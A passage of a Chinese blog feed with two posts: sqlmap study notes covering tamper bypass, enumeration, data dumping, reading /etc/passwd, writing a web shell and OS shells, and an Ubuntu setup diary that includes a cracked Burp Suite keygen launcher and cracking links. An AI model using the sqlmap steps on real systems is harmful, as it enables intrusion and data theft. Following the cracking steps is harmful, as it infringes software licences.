–tamper=”xxx1.py,xxx2.py”这样会在tamper目录下依次执行1,2脚本进行绕过，当然也可以指定绝对路径来执行tamper目录之外的脚本（对同一个payload执行1,2，并不是分开执行。比如同时使用大小写，内联注释/<em>!0000SelEct</em>/）</li></ul></li></ul><h2 id="Detection-探测"><a href="#Detection-探测" class="headerlink" title="Detection  探测"></a>Detection  探测</h2><ul><li>–level<ul><li>  1~5级。默认1级。可以在/usr/share/sqlmap/xml/payloads看下里面的payload，以及不同等级发送的payload类型</li></ul></li><li>–risk<ul><li>  1~4 默认1，他无害，当risk升高可造成数据被篡改等风险（update delete等操作），可能导致数据的不可恢复，进而网络安全法了解下</li></ul></li><li>–string=“xxx” –not-string=“xxx”,–regexp=“xxx”,–code=“200”,–text-only=“xxx”,–titles=“xxx”<ul><li>  页面比较，基于布尔的注入检测，sqlmap会依据返回页面内容的变化判断真假逻辑，但有些页面随着时间阀值变化，此时需要人为指定指标标示真假的依据</li></ul></li></ul><h2 id="technique-检测sql注入漏洞存在的类型"><a href="#technique-检测sql注入漏洞存在的类型" class="headerlink" title="technique 检测sql注入漏洞存在的类型"></a>technique 检测sql注入漏洞存在的类型</h2><ul><li>  默认使用全部技术 可以指定–technique=BEU</li><li>  B 布尔  E 错误  U 联合 T时间 S stacked queries（文件系统、操作系统，注册表必须使用S才能注入出来）</li><li>  –time-sec：指定时间注入检测相应延迟时间（默认5秒）</li><li>–union-cols：默认联合查询1-10列，随着level增加最多支持50列 <ul><li>  –union-cols 6-9：联合查询6-9列</li></ul></li><li>–union-char<ul><li>  联合查询默认使用null，极端情况下null可能失败，此时可以手动指定数值</li><li>  认?id=’ ‘union select ，经过比如–union-char 123，则为id=’123’union select</li></ul></li><li>–dns-domain<ul><li>  攻击者控制了某DNS服务器，使用此功能提高数据榨取速度，–dns-domain=”a.com”</li><li>  非常小众，而且仅仅只是提高速度而已</li></ul></li><li>–second-order<ul><li>  注入的结果在另外一个页面体现出来</li><li>  –second-ord http：//1.1.1.1/b.php</li></ul></li></ul><h2 id="fingerprint"><a href="#fingerprint" class="headerlink" title="fingerprint"></a>fingerprint</h2><ul><li>  -f/-b：DBMS，操作系统，架构，补丁</li></ul><h2 id="enumeration-枚举"><a href="#enumeration-枚举" class="headerlink" title="enumeration 枚举"></a>enumeration 枚举</h2><ol><li><p>探测</p><ul><li>–current-user/–user:当前数据库用户。而非操作系统管理员/所有用户账号</li><li>–current-db：当前数据库名称</li><li>–hostname</li><li>–privilege 查所有用户的权限  后面跟-U xxxx/-CU查指定/当前用户权限</li><li>–roles</li></ul></li><li><p>重要数据</p><ul><li>-D xx/-T xxx /-C xxx：指定数据库/表/列</li><li>–dbs/tables/columns：查库/表/列</li><li>–exclude-sysdbs:排除掉系统库</li><li>–schema：查元数据(存在information_schema库且有权访问他)</li><li>–count 看有几条记录</li><li>–batch：批处理，即每次选择的时候 选择默认选项，而不需要手动指定</li><li>dump数据 把数据下载到本地<ul><li>–dump-all dump所有数据 后面可以跟上 –exclude-sysdbs</li><li>–dump -C -T -D –start –stop ：自定义查询</li></ul></li><li>–sql-query=“select * from users”：指定特定的查询</li></ul></li></ol><h2 id="brute-force"><a href="#brute-force" class="headerlink" title="brute force"></a>brute force</h2><p>因为information_schema库只有在mysql5.0以上才有，而5.0以上还需要权限<br>微软的access数据库，默认无权读取msysobjects库</p><ul><li>–common-tables：暴力猜表</li><li>–common-columns：暴力猜列（可以-T 指定特定的表 不然就是破解当前表）</li></ul><h2 id="file-system"><a href="#file-system" class="headerlink" title="file system"></a>file system</h2><ul><li>  –file-read=”/etc/passwd”</li><li>  –file-write=”shell.php” ：shell必须在攻击者当前目录，不然就得注定绝对路径 –file-dest=“/var/www/html/xxx” 指定上传到受害者电脑上的位置</li></ul><h2 id="OS注入"><a href="#OS注入" class="headerlink" title="OS注入"></a>OS注入</h2><ul><li>–udf-inject: 注入用户自定义函数  –shared-lib:共享库的本地路径,从而实现UDFinjection 用户自定义函数注入<ul><li>  就是编译共享库创建并上传之DB server，以此生成自定义函数UDF实现高级注入</li><li>  需要有写入权限</li><li>  [paper](<a href="http://www.slideshare.net/inquis/advanced-sql-injection-to-operating-system-">http://www.slideshare.net/inquis/advanced-sql-injection-to-operating-system-</a><br>full-control-whitepaper-4633857)</li></ul></li><li>–os-cmd  –os-shell –sql-shell<ul><li>  也是要写权限！</li><li>  在mysql和postgresql上是利用上传共享库并且生成sysy_exec(),sys_eval()两个UDF，在mssql上利用的xp_cmdshell存储过程（有就用，禁就启，没有建）</li></ul></li><li>windows注册表注入<ul><li> 前提要有操作注册表权限</li><li>  –reg-read/–reg-add/–geg-del：读取/增加、删除注册表键值</li><li>  –reg-key/–geg-value/–reg-data/–reg-type=“xxx”：定义键值具体内容</li></ul></li></ul><h2 id="一般参数"><a href="#一般参数" class="headerlink" title="一般参数"></a>一般参数</h2><ul><li>  -s：sqlite会话保存位置</li><li>  -t:记录流量位置保存位置</li><li>  –charset=“GBK”:强制字符编码</li><li>  –crawl=N:从起始位置爬站的深度</li><li>  –csv-del：dump下来的数据默认存于以”,”分割的CSV文件中，可以指定其他的分隔符</li><li>  –dbms-cred=”usr:passwd”：指定数据库账号</li><li>  –flush-session：清空刚刚查询的本地缓存session内容（本地缓存session的机制使得第二次执行的速度更快）</li><li>  –refresh-queries:忽略session查询结果</li><li>  –force-ssl：使得访问https的网站</li><li>  –hex：dump非ascii字符内容时，将其编码为16进制形式之后下载，绕过传输过程中的一定的过滤或其他影响，收到后sqlmap自动解码还原</li><li>  –output-dir=/temp/xxx  指定输出结果保存位置</li><li>  –parse-errors：分析和显示数据库内建报错信息</li><li>  –save：将命令保存为配置文件，需要指定保存位置</li><li>  -z：参数助记符,比如–batch 可以写成 -z=”bat”表示</li><li>  –answer=“extend=N” 适用于某些地方需要你手动填写，batch处理总以默认处理，你又不想默认值，于是遇到比如extend的时候 这个时候回答就是N</li><li>  –check-waf：检测waf/ips/ids</li><li>–hpp：http parameter pollution<ul><li>  绕过WAF、IPS、IDS的有效方法</li><li>  尤其对工作在windows平台的站点ASP/iis和asp.net/iis有用</li></ul></li><li>–identify-waf：彻底的waf/ips/ids检查<ul><li>  支持30多种产品</li></ul></li></ul><h2 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h2><ul><li>  –mobile:模拟手机设备</li><li>  –purge：清空output文件夹（同时也就清除了session）</li><li>  –smart：当有大量检测目标时，只选择被怀疑有注入点的地方进行注入，而非每个都尝试</li><li>  –wizard：向导 即提示你一步一步的填写入参数。但是只是填写基础的参数</li></ul><h1 id="资料"><a href="#资料" class="headerlink" title="资料"></a>资料</h1><ul><li>  网页版：freebuf<a href="https://www.freebuf.com/sectool/164608.html">https://www.freebuf.com/sectool/164608.html</a></li><li>  图片版：原图4.2M，出处见图水印，可以自己用网页打开下载到本地<br><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190708233306.png" alt="20190708233306.png"></li></ul>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>学习笔记</tag>
      
      <tag>渗透测试</tag>
      
      <tag>sqlmap</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>一年的ubuntu使用之旅</title>
    <link href="/2019/06/29/%5Bold%5D%E7%9F%AD%E6%9A%82%E7%9A%84ubuntu%E4%B9%8B%E6%97%85/"/>
    <url>/2019/06/29/%5Bold%5D%E7%9F%AD%E6%9A%82%E7%9A%84ubuntu%E4%B9%8B%E6%97%85/</url>
    
    <content type="html"><![CDATA[<h1 id="Ubuntu之路"><a href="#Ubuntu之路" class="headerlink" title="Ubuntu之路"></a><center>Ubuntu之路</center></h1><blockquote><p>4月底win10睡个午觉之后起来就突然死机，尝试各种办法但是电脑文件始终存在问题，一怒之下换了ubuntu，开始了为期两个月的虐恋。终究由于实习所以又回到了window的怀抱</p></blockquote><hr><h1 id="软件"><a href="#软件" class="headerlink" title="软件"></a><center>软件</center></h1><h2 id="直接商店"><a href="#直接商店" class="headerlink" title="直接商店"></a>直接商店</h2><p>微信，VSCODE，vlc，网易云音乐,netspeed<br>截图软件：深度截图（shuttle没有截图编辑，hotshots没试过但是太难安装了我安装失败，且深度够用了）</p><h2 id="apt一把梭"><a href="#apt一把梭" class="headerlink" title="apt一把梭"></a>apt一把梭</h2><p><del>terminator  因为怀疑导致死机的原因</del><br><a href="https://linux.cn/article-9349-1.html">tlp</a><br>天气：sudo apt install gnome-shell-extension-weather<br>workrave(<a href="https://tieba.baidu.com/p/1391149484?red_tag=2579349889">使用方法</a></p><h2 id="deepinwine"><a href="#deepinwine" class="headerlink" title="deepinwine"></a>deepinwine</h2><ol><li> 仓库<a href="https://github.com/wszqkzqk/deepin-wine-ubuntu">https://github.com/wszqkzqk/deepin-wine-ubuntu</a></li><li> QQ无法输入中文 <a href="https://blog.csdn.net/bnjwjc/article/details/88623428">传送门</a>:只需要改run.sh即可</li></ol><h2 id="安装shadowsock（搭配baacloud）"><a href="#安装shadowsock（搭配baacloud）" class="headerlink" title="安装shadowsock（搭配baacloud）"></a>安装shadowsock（搭配baacloud）</h2><ol><li><a href="https://github.com/baacloud/url">baacloud网站</a></li><li><a href="https://blog.csdn.net/u014257615/article/details/70184567">如何安装shadow的这个客户端</a></li></ol><p>中间出现的问题</p><blockquote><p>仓库 “<a href="http://ppa.launchpad.net/hzwhuang/ss-qt5/ubuntu">http://ppa.launchpad.net/hzwhuang/ss-qt5/ubuntu</a> bionic Release” 没有 Release 文件。</p><blockquote><p>在你的/etc/apt/sources.list.d目录下，看 这个文件(hzwhuang-ubuntu-ss-qt5-bionic.list )将里面的bionic 改成xenial ,保存再运行 sudo apt-get update ,最后再运行一次 sudo apt-get install shadowsocks-qt5 就好了。<br><a href="https://bbs.csdn.net/topics/392381640">https://bbs.csdn.net/topics/392381640</a></p></blockquote></blockquote><h2 id="vmware"><a href="#vmware" class="headerlink" title="vmware"></a>vmware</h2><p>尝试了wget，但是速度太慢了，下了两天 老有问题 就下的bundle版本,貌似是这两天改的<br><a href="https://www.vmware.com/go/getWorkstation-linux">直接网页打开这个链接，直接先下载再说</a> 你可以在官网找地址，不过貌似要注册账号？<br><a href="https://www.cnblogs.com/travellife/p/4077217.html">如何按照这里的方法改文件地点，安装即可</a><br>安装时可能会遇到一定的问题，比如gcc版本和build  environment等<br><a href="https://blog.csdn.net/weixin_40894428/article/details/82911186">解决方案</a></p><h2 id="gif录制"><a href="#gif录制" class="headerlink" title="gif录制"></a>gif录制</h2><p><a href="https://github.com/phw/peek">peek</a></p><h2 id="输入法"><a href="#输入法" class="headerlink" title="输入法"></a>输入法</h2><p><a href="https://blog.csdn.net/fx_yzjy101/article/details/80243710">如何安装搜狗拼音</a><br><a href="https://www.cnblogs.com/youpeng/p/10276133.html">记得关闭搜狗的云联想功能，因为占内存大大的</a></p><h2 id="chrome"><a href="#chrome" class="headerlink" title="chrome"></a>chrome</h2><p><a href="https://www.google.cn/chrome/">官方下载</a><br><a href="https://jingyan.baidu.com/article/fdbd4277b96a14b89e3f48e5.html">chrome如何开启自带的翻译</a><br><a href="https://github.com/FelisCatus/SwitchyOmega/releases">switchOMega</a>不要用最新的crx，用上个版本的拖进去安装即可（5.19那个，5.2当时是最新）<br>我的插件：lastpass，onetab,vimxxx,infinite,ADB,<a href="https://blog.csdn.net/jyg123/article/details/86690073">charset</a>(解决chrome乱码问题)<br><del><a href="https://github.com/Semibold/Weibo-Picture-Store">sina图床</a></del></p><h2 id="信安小工具"><a href="#信安小工具" class="headerlink" title="信安小工具"></a>信安小工具</h2><p><a href="https://github.com/AntSwordProject/antSword">antsword</a><br><a href="https://github.com/maurosoria/dirsearch">dirsearch</a><br><a href="https://github.com/TheKingOfDuck/MySQLMonitor">mysqlmonitor</a></p><h2 id="UltraEdit"><a href="#UltraEdit" class="headerlink" title="UltraEdit"></a>UltraEdit</h2><p>download:<a href="https://www.ultraedit.com/downloads/uex.html">https://www.ultraedit.com/downloads/uex.html</a><br>compare:<a href="https://www.ultraedit.com/downloads/ucx.html">https://www.ultraedit.com/downloads/ucx.html</a><br>破解：<a href="https://blog.csdn.net/xiaoxiao133/article/details/82846429">https://blog.csdn.net/xiaoxiao133/article/details/82846429</a></p><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>护眼软件：safe eyes:<a href="http://slgobinath.github.io/SafeEyes/(workrave%E8%A2%AB%E6%88%91password%E6%8E%89%E4%BA%86)">http://slgobinath.github.io/SafeEyes/(workrave被我password掉了)</a></p><blockquote><p>sudo add-apt-repository ppa:umang/indicator-stickynotes<br>sudo apt-get update<br>sudo apt-get install indicator-stickynotes </p></blockquote><hr><h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><h2 id="java安装"><a href="#java安装" class="headerlink" title="java安装"></a>java安装</h2><blockquote><ol><li>虽然可以添加仓库之后，<a href="https://tecadmin.net/install-oracle-java-11-ubuntu-18-04-bionic/">apt一键安装oracle 11版本</a>，但是BP不支持，所以必须手动下载包去安装jdk-8</li><li> 虽然可以不用添加仓库直接openjdk，但是BP对11版本还是不支持，当时有8的版本弄了半天还是无法运行，就放弃了（因为启动BP是用Java -xxxxx的命令行启动，而不是11版本可以所谓的右键文件直接启动）</li><li>其他网上的Java8 搞个仓库然后apt install的安装过期了。。。</li></ol></blockquote><p>wode 安装步骤</p><ol><li> <a href="https://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html">在官网下载包</a></li><li> <a href="https://www.jianshu.com/p/3e7bb41a1464">然后按照这个网址的来一步步执行</a>虽然是他是16.04，但是包没变基本环境也没变化，所以问题不大</li></ol><p>关于burp的快捷方式</p><blockquote><p>基于上面的创建所得到的快捷方式比较麻烦，必须先加载注册器，但是我想直接一键命令行然后直接启动程序<br>找到的脚本来自<a href="http://ximcx.cn/post-110.html">西门吹雪大大</a>:<br>java -Xbootclasspath/p:burp-loader-keygen-jas502n.jar -jar burpsuite_pro_v2.0.04beta.jar</p><blockquote><p>最终我的脚本:<br>记得路径！路径！我就是掉了/opt/burp啥来着！<br>同时命令不能有空格！我复制粘贴进去因为格式原因的空格就报错了<br><code>#!/bin/bash</code><br><code>java -Xbootclasspath/p:/opt/burp/burp-loader-keygen.jar -jar /opt/burp/``burpsuite_pro_v2.0beta.jar</code></p></blockquote></blockquote><p>因为中途走了些歪路，就是11那个事情，就要卸载，但是普通的Remove卸载不干净。于是找来了这些方法</p><blockquote><p>卸载openjdk</p><ol><li> sudo apt-get purge openjdk*</li><li> sudo apt-get purge icedtea-* openjdk-*</li><li> dpkg –list | grep -i jdk  查看还有没有包即可<br>卸载oraclejdk</li><li> apt-cache search java | awk ‘{print($1)}’ | grep -E -e ‘^(ia32-)?(sun|oracle)-java’ -e ‘^openjdk-‘ -e ‘^icedtea’ -e ‘^(default|gcj)-j(re|dk)’ -e ‘^gcj-(.*)-j(re|dk)’ -e ‘java-common’ | xargs sudo apt-get -y remove</li><li> sudo apt-get -y autoremove</li><li> bash -c ‘ls -d /home/*/.java’ | xargs sudo rm -rf</li><li> rm -rf /usr/lib/jvm/*</li><li> dpkg –list | grep -i jdk 查看还有没有包即可</li></ol></blockquote><h3 id="安装idea"><a href="#安装idea" class="headerlink" title="安装idea"></a>安装idea</h3><ol><li> 到jetbrains官网，选择Ultimate版本的tar.gz包下载<a href="https://www.jetbrains.com/idea/download/#section=linux">传送门</a><br>由于是学生，所以我用的教育账号。我的账号<a href="mailto:&#50;&#x30;&#49;&#55;&#x78;&#x78;&#x78;&#120;&#120;&#51;&#48;&#64;&#115;&#116;&#x75;&#46;&#120;&#120;&#120;&#46;&#101;&#x64;&#x75;&#46;&#x63;&#x6e;">&#50;&#x30;&#49;&#55;&#x78;&#x78;&#x78;&#120;&#120;&#51;&#48;&#64;&#115;&#116;&#x75;&#46;&#120;&#120;&#120;&#46;&#101;&#x64;&#x75;&#46;&#x63;&#x6e;</a></li><li>idea无法输入中文<br>解决方案<a href="https://www.jianshu.com/p/d9a1f2e1e7a7">传送门</a></li><li>创建第一个项目<ol><li>初次创建项目显示没有SDK <a href="https://blog.csdn.net/li_894389175/article/details/80338955">传送门</a><br>我的路径：/opt/jdk1.8.0_211/jre</li><li> 怎么输出hello world<a href="https://blog.csdn.net/oschina_41790905/article/details/79475187">传送门</a></li></ol></li><li>链接数据库<ol><li> <a href="https://jingyan.baidu.com/article/ce09321bbcaddf2bfe858f56.html">传送门</a>,按照这个能链接到mysql数据库，但是无法执行网上给的jdbc测试demo，无法执行其中sql语句</li><li> 能执行sql语句的程序demo：<a href="https://www.jianshu.com/p/3c2453125542">传送门</a>，这个的话，需要找到刚刚download  jdbc驱动的的路径：/home/corp0ra1/.IntelliJIdea2019.1/config/jdbc-drivers/MySQL Connector/J 8/8.0.15/xx</li><li> 此时可以查询出来数据，但是会报错<code>Loading classcom.mysql.jdbc.Driver. This is deprecated.</code><a href="https://www.cnblogs.com/jayworld/p/9706763.html">解决方案</a><h3 id="tomcat-创建web项目"><a href="#tomcat-创建web项目" class="headerlink" title="tomcat+创建web项目"></a>tomcat+创建web项目</h3>配置<a href="https://www.cnblogs.com/yellowgg/p/9656030.html#tiaozhuan2">传送门</a><br>中间处理的问题</li></ol></li><li> 下载安装包<a href="https://tomcat.apache.org/download-80.cgi">传送门</a></li><li> 查看java home：<code>echo $JAVA_HOME</code></li><li> 最好按照他的配置class 和lib文件目录，不然访问的url路径有一定问题</li></ol><h2 id="安装php环境"><a href="#安装php环境" class="headerlink" title="安装php环境"></a>安装php环境</h2><ul><li><p><a href="https://www.cnblogs.com/opsprobe/p/9126411.html">php基本环境安装步骤</a>:唯一的区别在于 最后一项他是7.0XXXX  最新版本是7.2XXX 改个版本号即可</p><ul><li>后面为了实验方便，同时安装了5.6版本的php<a href="https://blog.csdn.net/qq_42876636/article/details/85176701">参考网站</a>。此版本名字包含deb.sury.org/，说明这个php库由<a href="https://deb.sury.org/%E6%9D%A5%E7%BB%B4%E6%8A%A4%E7%9A%84">https://deb.sury.org/来维护的</a><blockquote><p>① sudo add-apt-repository ppa:ondrej/php<br>②sudo apt install php5.6 php5.6-gd php5.6-cgi php5.6-mysql php5.6-xml php5.6-json php5.6-mcrypt php5.6-common php5.6-dev</p></blockquote></li><li>  通过①sudo a2dismod php7.2关闭②sudo a2enmod php5.6开启 ③/etc/init.d/apache2 restart重启。来切换版本</li><li>  <img src="https://ws2.sinaimg.cn/large/006MpoZqgy1g391n2frfqj30ro07pt99.jpg"></li></ul></li><li><p><a href="https://blog.csdn.net/its_my_dream/article/details/78549619">php  With VScode</a>：用来debug和写代码</p><ol><li>安装xdebug:apt-get install php-xdebug以及VS code的phpDebug拓展</li><li>重启服务。并非非Php-fmp而是sudo /etc/init.d/apache2 restart即可。因为fmp貌似是lnmp的ngnix的，但是我是lamp，为Apache</li><li>修改配置文件 sudo gedit /etc/php/7.2/apache2/php.ini，同上因为我是LAMP，所以是Apache，而不是cli下的php.ini<blockquote><p>[XDebug]<br> xdebug.remote_enable=1<br> xdebug.remote_autostart=1<br> xdebug.remote_port=9001<br> 9001同时也改vscode的xdebug的配置文件，貌似9000被其他服务占据？反正我win10上面改过9001，Linux也就。。。改了吧<br> 其中php7.2-dev为了安装xdebug所以必须安装。</p></blockquote></li><li>记得设置断点才能debug!!!我是说怎么半天不能debugT.T</li><li>上面配置的php5.6的php.ini文件，这个时候应该配置5.6，比较装了5.6版本，我是说…</li></ol></li><li><p>phpstorm</p><ul><li>  软件中心下载的，接合<a href="http://idea.lanyus.com/">这个网站</a>激活到2020年,修改了下host，屏蔽了几个网站</li><li>  php默认是7.2  在usr/bin下还有php5.6 php7.2 可以通过这两个命令来各自执行版本，进而解决</li></ul></li></ul><h2 id="python"><a href="#python" class="headerlink" title="python"></a>python</h2><ul><li>貌似自带python：Python 2.7.15rc1（默认）和Python 3.6.7<br>  我自己安装两个pip库：sudo apt install python3-pip/sudo apt install python-pip</li></ul><h2 id="go"><a href="#go" class="headerlink" title="go"></a>go</h2><p>官方文档:<a href="https://golang.google.cn/dl/h">https://golang.google.cn/dl/h</a><br>按照弹出的页面提示进行相关配置即可 </p><h2 id="信安练习靶场"><a href="#信安练习靶场" class="headerlink" title="信安练习靶场"></a>信安练习靶场</h2><ul><li>  <a href="https://github.com/c0ny1/upload-labs">uploadlabs</a></li><li>  <a href="https://github.com/zhuifengshaonianhanlu/pikachu">pikachu</a></li><li><a href="https://github.com/firesunCN/BlueLotus_XSSReceiver">xss平台</a>:密码常用的 加密默认RC4<br>  记得sudo chmod  -R 777 /var/www/html/xxx<br>  先安装完成在改名（不知道啥，反正我一开始改名在安装就出问题了，可能偶然现象？）</li></ul><p>为了实现 <code>xss.com</code>,<code>upload.com</code>这样类似window下phpstudy实现的效果，可以参考：<a href="https://blog.csdn.net/nookl/article/details/87909780">多目录文件的建立</a>（lamp）<br>    1.  修改host文件：/etc/hosts 加上127.0.0.1 pikachu.com<br>    2.   cd /etc/apache2/sites-available/<br>    3.  sudo cp 000-default.conf pikachu.conf<br>    4.  sudo vim pikachu.conf<br>    5.  sudo a2ensite pikachu.conf<br>    6.  sudo service  apache2 restart//我的Ubuntu命令是/etc/init.d/apache2 restart </p><h2 id="美化"><a href="#美化" class="headerlink" title="美化"></a>美化</h2><blockquote><p>别入坑！适可而止。因为Ubuntu很容易就让你陷入总想着把他美化的怪圈而耗费过多时间</p></blockquote><ul><li><p>  <a href="https://blog.csdn.net/abutoto/article/details/85308476">字体</a>:也可以全套一起梭哈的命令(sudo apt install fonts-wqy-microhei)<br>不推荐微软雅黑，第一win的版权，第二我尝试过，有个库老连接不上去导致安装有问题</p></li><li><p>  <a href="https://blog.csdn.net/xkwy100/article/details/80456168">隐藏顶部栏</a>:其实就是个插件：hide-top-bar（商店就有）</p></li><li><p>  <a href="https://www.pxwall.com/wp-content/uploads/2018/04/Colors%20Huawei%20Honor%207X%20Stock5084817680-1920x1080.jpg">壁纸</a>:google搜图真香，华为牛逼！</p></li><li><p>  <a href="https://blog.csdn.net/aishuju1/article/details/85064432">dock之mac主题安装</a>：mac就够了吧，选多了，浪费时间，反正不久又要再装一次23333</p></li><li><p>  <a href="https://blog.csdn.net/litble/article/details/82865658">conky安装</a></p><blockquote><p>conky安装方式很简单:sudo apt-get install conky-all<br>但是你发现这个的conky非常丑，我们就需要用conky manager 来美化一下。<br>但是接着你又发现ubuntu18.04是没有conky manager的，所以运行以下命令：<br>wget –no-check-certificate <a href="https://github.com/teejee2008/conky-manager/releases/download/v2.4/conky-manager-v2.4-amd64.run">https://github.com/teejee2008/conky-manager/releases/download/v2.4/conky-manager-v2.4-amd64.run</a><br>chmod +x conky-manager-v2.4-amd64.run<br>sudo ./conky-manager-v2.4-amd64.run<br>接着运行以下conky-manager，你的文件夹里就会出现一个.conky目录，将你的配置文件丢进去即可配置。<br>(别下作者的gayhub下deb包，我下的貌似运行半天都没用，重启过也是)</p></blockquote></li><li><p>  conky主题：</p></li></ul><p><a href="https://www.deviantart.com/xexpanderx/art/3D-conky-434361229">主题1</a>:苑老师同款，但是存在问题,可以考虑加点其他的主题一起使用，简单的改下坐标即可</p><blockquote><p>纵坐标+350 横坐标变不动 不晓得为啥，而且他的框框 有点违和</p></blockquote><p><a href="https://www.deviantart.com/dobbie03/art/Elegance-Rainmeter-Conky-526588187">主题2</a>:为了加个时间</p><blockquote><p>own_window_hints undecorated,below,skip_taskbar,skip_pager<br>然后改坐标</p></blockquote><ul><li>  <a href="https://www.jianshu.com/p/5c8d4a1f4c91">另外一个conky（含天气等但是难配置）</a>:放弃了，太难对齐了貌似是因为要下个字体？</li></ul><hr><h1 id="各种问题"><a href="#各种问题" class="headerlink" title="各种问题"></a>各种问题</h1><h2 id="设置vscode快捷方式"><a href="#设置vscode快捷方式" class="headerlink" title="设置vscode快捷方式"></a>设置vscode快捷方式</h2><p>部分文件，尤其是var下的www文件会显示vs权限不足，执行下面的命令：</p><blockquote><p>sudo code –user-data-dir=”<del>/.vscode-root”<br>这个只是临时的 该程序具有超级用户权限而已<br>可以设置快捷方式  名字为vscode，默认的普通权限的就是code<br>sudo gedit  /usr/bin/vscode<br>#!/bin/bash<br>sudo code –user-data-dir=”</del>/.vscode-root”</p></blockquote><p>sudo chmod  +x /usr/bin/vscode</p><h2 id="桌面文件快捷方式"><a href="#桌面文件快捷方式" class="headerlink" title="桌面文件快捷方式"></a>桌面文件快捷方式</h2><p>sudo ln -s /var/www/html/  /home/corp0ra1/桌面/</p><h2 id="github-with-vscode"><a href="#github-with-vscode" class="headerlink" title="github with vscode"></a>github with vscode</h2><p>win转Linux，没有了OneNote，想着找个替代品：为知笔记？付费！蚂蚁笔记？也付费虽然带blog。等等等很多吧，但是感觉都没有onenote的那种自由，想在那写就在那里写的感jio。网易云笔记,evenote也不支持Linux。<br>找到了p3xnote，本质上也通过浏览器访问，只不过用的不是你的浏览器，是他自己的写的那种，我用的时候由于墙的原因，卡的一动不动的（evenote，网易云笔记也可以这种），那我为啥不直接网页版的。但是OneNote？网页版受限于网速蛋疼，而且最关键启动速度，离线笔记，自动保存等。。。<br>我还不如就用vscode编写markdown，然后通过github（免费，永久的，而且体量大，不存在小网站跑路，笔记消失的情况）于是找到了以下的方法</p><ul><li>  <a href="https://blog.csdn.net/lhb_11/article/details/77837078">方法</a>：一定要在你要push的目录下执行这些命令</li><li>  <a href="https://blog.csdn.net/cbkting/article/details/728567901">推送的markdown格式乱码</a>:只是因为markdown格式标准<br>不同而已<blockquote><p>好吧，第二天由于php安装问题重装系统，然后找到了坚果云这种方法，其实也挺不错的，比github方便不少。当然前者你可以更多的练习git命令，但是新手的我而言，当务之急是保存下我的这些安装笔记！</p><blockquote><p>坚果云有linux版本，类似于onedrive，自动同步文件，借此可以同步我的笔记</p></blockquote></blockquote></li></ul><h2 id="Ubuntu的备份与恢复"><a href="#Ubuntu的备份与恢复" class="headerlink" title="Ubuntu的备份与恢复"></a>Ubuntu的备份与恢复</h2><p>tar一个文件进了study盘就没了，怎么用就不知道了，反正只是常用方法<br>好吧，我承认，我真的不会，还是遇到一次重装一次吧，也是我写下这个MD的目的<br>##驱动<br>取消默认 换为nvdia的390即可。一遇到关机重启卡死的情况，就是这个了。如果你先前设置过，还出这个问题，下次重启的时候在检查一次。因为我就是没检查还以为是其他情况。。。</p><h2 id="没有netstat"><a href="#没有netstat" class="headerlink" title="没有netstat"></a>没有netstat</h2><p> sudo apt install gnometool</p><h2 id="firefox窗口问题"><a href="#firefox窗口问题" class="headerlink" title="firefox窗口问题"></a>firefox窗口问题</h2><p><a href="https://support.mozilla.org/en-US/kb/firefox-already-running-not-responding">https://support.mozilla.org/en-US/kb/firefox-already-running-not-responding</a></p><ul><li>  kill掉</li><li>  修改权限（原本是700 我改成777了 不知道是否还会出现问题）</li></ul><h2 id="Ubuntu“下载额外数据文件失败-ttf-mscorefonts-installer”"><a href="#Ubuntu“下载额外数据文件失败-ttf-mscorefonts-installer”" class="headerlink" title="Ubuntu“下载额外数据文件失败 ttf-mscorefonts-installer”"></a>Ubuntu“下载额外数据文件失败 ttf-mscorefonts-installer”</h2><p><a href="https://www.zeyes.org/blog/2017/09/solve-ubuntu-download-ttf-mscorefonts-installer-failed.html">https://www.zeyes.org/blog/2017/09/solve-ubuntu-download-ttf-mscorefonts-installer-failed.html</a><br><a href="https://askubuntu.com/questions/463754/how-to-make-ttf-mscorefonts-installer-package-download-fonts-after-it-says-it-i">https://askubuntu.com/questions/463754/how-to-make-ttf-mscorefonts-installer-package-download-fonts-after-it-says-it-i</a></p><h2 id="切换mysql-或者www用户显示This-account-is-currently-not-available"><a href="#切换mysql-或者www用户显示This-account-is-currently-not-available" class="headerlink" title="切换mysql 或者www用户显示This account is currently not available"></a>切换mysql 或者www用户显示<code>This account is currently not available</code></h2><p><a href="https://www.cnblogs.com/alex-blog/articles/2914361.html">https://www.cnblogs.com/alex-blog/articles/2914361.html</a><br>查看用户的shell<br>grep “用户名” /etc/passwd<br>如果用户默认的shell是/sbin/nologin 修改为/bin/bash</p><h2 id="桌面只能新建文件，不能新建文档"><a href="#桌面只能新建文件，不能新建文档" class="headerlink" title="桌面只能新建文件，不能新建文档"></a>桌面只能新建文件，不能新建文档</h2><p><a href="https://jingyan.baidu.com/article/6079ad0ecbc85428ff86dbdc.html">解决方案</a></p><h2 id="ubuntu-蓝牙自动启动"><a href="#ubuntu-蓝牙自动启动" class="headerlink" title="ubuntu 蓝牙自动启动"></a>ubuntu 蓝牙自动启动</h2><p><a href="https://askubuntu.com/questions/67758/how-can-i-deactivate-bluetooth-on-system-startup">https://askubuntu.com/questions/67758/how-can-i-deactivate-bluetooth-on-system-startup</a></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">sudo install -b -m <span class="hljs-number">755</span> <span class="hljs-regexp">/dev/</span>stdin <span class="hljs-regexp">/etc/</span>rc.local &lt;&lt; EOF<br><span class="hljs-comment">#!/bin/sh</span><br>rfkill block bluetooth<br><span class="hljs-keyword">exit</span> <span class="hljs-number">0</span><br>EOF<br></code></pre></td></tr></table></figure><p>即可</p><h2 id="vscode无法使用Ctrl-C-X等"><a href="#vscode无法使用Ctrl-C-X等" class="headerlink" title="vscode无法使用Ctrl C  X等"></a>vscode无法使用Ctrl C  X等</h2><p><a 